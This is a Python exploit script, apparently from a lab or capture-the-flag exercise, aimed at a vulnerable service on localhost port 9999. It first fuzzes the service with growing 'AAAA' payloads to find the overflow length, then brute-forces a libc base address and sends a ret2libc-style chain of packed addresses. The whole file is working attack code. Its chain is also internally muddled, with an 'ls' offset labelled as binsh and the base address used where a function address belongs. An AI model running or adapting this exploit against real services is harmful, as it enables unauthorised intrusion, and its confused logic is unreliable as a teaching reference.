"""Buffer overflow exploit script for vulnerable service."""
import struct
import time
import socket

N = 10
HOST = "localhost"
PORT = 9999

while True:
    PAYLOAD = b'AAAA' * N
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((HOST, PORT))
        sock.sendall(PAYLOAD)
        response = sock.recv(1024)
        print(f"Response: {response}")
        if not response:
            print("No response from server, breaking...")
            break
        time.sleep(0.1)  # Wait for a bit before next attempt
    except socket.error as e:
        print(f"Socket error: {e}")
        break
    finally:
        sock.close()
    N += 1
print(f"Número que falló: {N}")

N -= 1  # ajustar como en bash

BASE = 0xf7c00670
PAYLOAD = b'AAAA' * N  # bytes
ATTEMPT = 0

while BASE < 0xf7e00670:
    # Empaquetar dirección BASE en little endian
    hex_packed = struct.pack('<I', BASE)
    # print(f"Direccion de memoria generada: 0x{BASE:08X}")

    LS_ADDR = BASE + 0x17C2E6  # offset de "ls" en libc
    EXIT_ADDR = BASE - 0x15540  # dirección de la función exit() o similar
    junk_addr = struct.pack('<I', EXIT_ADDR)  # dirección de la función exit() o similar
    binsh_packed = struct.pack('<I', LS_ADDR)

    # Construir payload final: payload + base + binsh
    final_payload = PAYLOAD + hex_packed + junk_addr + binsh_packed
    print(f"Intento: {ATTEMPT} - BASE: 0x{BASE:08X} - binsh_addr: 0x{LS_ADDR:08X} - "
        f"junk_addr: 0x{struct.unpack('<I', junk_addr)[0]:08X} - "
        f"binsh_packed: 0x{struct.unpack('<I', binsh_packed)[0]:08X}")
    # Mostrar payload en formato hex para debug (opcional)
    # import sys
    # sys.stdout.buffer.write(final_payload)

    # Enviar binario directo a stdout (como un pipe a nc)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((HOST, PORT))
        # Send payload
        sock.sendall(final_payload)
        # Receive response
        response = sock.recv(2048)
        if response:
            print(f"Response: {response}")
            print("IT WORKED!")
            print(f"BASE: 0x{BASE:08X} - binsh_addr: 0x{LS_ADDR:08X} - "
                  f"junk_addr: 0x{struct.unpack('<I', junk_addr)[0]:08X} - "
                  f"binsh_packed: 0x{struct.unpack('<I', binsh_packed)[0]:08X}")
            break
        # Wait before next attempt
        time.sleep(0.1)
    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        sock.close()

    ATTEMPT += 1
    BASE += 0x1000

print(f"Stopped at BASE: 0x{BASE:08X}")
